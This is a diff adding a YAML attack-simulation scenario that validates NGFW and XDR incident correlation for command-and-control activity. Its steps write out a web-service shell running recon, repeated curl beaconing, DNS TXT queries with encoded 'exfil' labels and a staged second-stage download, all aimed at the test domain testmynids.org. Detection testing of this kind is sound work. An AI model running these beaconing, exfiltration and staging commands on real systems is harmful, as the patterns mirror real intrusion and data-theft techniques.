@@ -1,0 +1,146 @@
+scenario_id: SIM-MP-001
+name: "C2 Beacon Callback — NGFW + XDR Stitch Validation"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - Analytics
+  - BIOC
+  - IOC
+
+uc_ref: UCS-MP-01
+tc_ref: TC-MP-01
+uc_name: "Cross-Plane Incident Stitching"
+tc_name: "NGFW Session + XDR Process Lineage Correlation"
+
+mitre_tactic: "TA0011"
+mitre_tactic_name: "Command and Control"
+mitre_technique: "T1071.001"
+mitre_technique_name: "Application Layer Protocol: Web Protocols"
+additional_techniques:
+  - technique: "T1059.004"
+    name: "Command and Scripting Interpreter: Unix Shell"
+  - technique: "T1105"
+    name: "Ingress Tool Transfer"
+
+threat_report: "Unit42 - Cobalt Strike Beacon Network Analysis"
+threat_report_url: "https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/"
+
+execution_identity:
+  default: www-data
+  options:
+    - www-data
+    - root
+
+push_supported: true
+pull_supported: true
+
+required_content:
+  - repo: "3CORESec/testmynids.org"
+  - repo: "outflanknl/RedELK"
+
+infra_modules_needed:
+  - base
+  - edr
+  - ndr
+
+external_tools:
+  - name: testmynids
+    source: "https://github.com/3CORESec/testmynids.org"
+    type: script
+    install_inline: true
+
+steps:
+  - id: step-01
+    name: "Endpoint: spawn interactive shell from web service"
+    command: |
+      echo '[MP-001] XDR side: simulating web-app-spawned shell';
+      bash -c 'id; whoami; uname -a' 2>&1;
+      echo '[*] This command produces a BIOC on XDR for "shell spawned from www-data"'
+    identity: www-data
+    mitre_technique: "T1059.004"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "XDR — interactive bash spawned from www-data service context"
+
+  - id: step-02
+    name: "Endpoint: HTTP beacon callback to known-bad test domain"
+    command: |
+      echo '[MP-001] Network side: repeated outbound HTTP to known-bad indicator';
+      for i in 1 2 3 4 5; do
+        curl -sSL -m 10 -A 'Mozilla/5.0 (compatible; CortexSimBeacon/1.0)' \
+          "http://testmynids.org/uid/index.html?beacon=$i" -o /dev/null || true;
+        sleep 12;
+      done
+      echo '[*] NGFW should flag repetitive beaconing pattern from DMZ endpoint'
+    identity: www-data
+    mitre_technique: "T1071.001"
+    expected_detections:
+      - plane: NDR
+        type: Analytics
+        description: "NGFW — repetitive HTTP beacon to testmynids.org (known IOC list)"
+      - plane: EDR
+        type: BIOC
+        description: "XDR — curl executed from www-data with suspicious user-agent"
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM correlation — NGFW outbound session + XDR process event sharing src_host + session_time stitched into single incident"
+
+  - id: step-03
+    name: "DNS tunneling exfil pattern"
+    command: |
+      echo '[MP-001] DNS side: short-TTL TXT queries simulating data exfiltration';
+      for i in $(seq 1 20); do
+        dig +short TXT "exfil-$(echo -n "payload_chunk_$i" | base32 | tr -d = | head -c 30).testmynids.org" @1.1.1.1 > /dev/null || true;
+        sleep 1;
+      done
+      echo '[*] NGFW DNS analytics should flag anomalous TXT volume with high-entropy labels'
+    identity: www-data
+    mitre_technique: "T1572"
+    expected_detections:
+      - plane: NDR
+        type: Analytics
+        description: "NGFW — DNS anomaly: high TXT query volume with high-entropy labels"
+      - plane: EDR
+        type: Analytics
+        description: "XDR — repetitive dig invocation from service account"
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM stitching — DNS exfil pattern correlated with process lineage into unified exfiltration incident"
+
+  - id: step-04
+    name: "Ingress tool transfer (download simulated second-stage)"
+    command: |
+      echo '[MP-001] Staging: download of simulated second-stage payload';
+      curl -sSL -o /tmp/cortexsim_stage2.sh http://testmynids.org/uid/index.html;
+      ls -la /tmp/cortexsim_stage2.sh;
+      echo '[*] Not executed - just staged for BIOC detection'
+    identity: www-data
+    mitre_technique: "T1105"
+    expected_detections:
+      - plane: NDR
+        type: Analytics
+        description: "NGFW — download from IOC-listed domain matching threat intel feed"
+      - plane: EDR
+        type: BIOC
+        description: "XDR — file written to /tmp/ by curl from service account"
+      - plane: ANALYTICS
+        type: IOC
+        description: "XSIAM — IOC match on downloaded URL cross-references TIM feed and endpoint file hash"
+
+cleanup:
+  commands:
+    - "rm -f /tmp/cortexsim_stage2.sh"
+    - "echo '[CortexSim] SIM-MP-001 cleanup complete - no persistent artifacts'"
+
+author: "Henry Reed"
+created: "2026-04-20"
+last_updated: "2026-04-20"
+tags:
+  - multi-plane
+  - stitching
+  - ngfw-xdr-correlation
+  - c2-beacon
+  - dns-tunneling
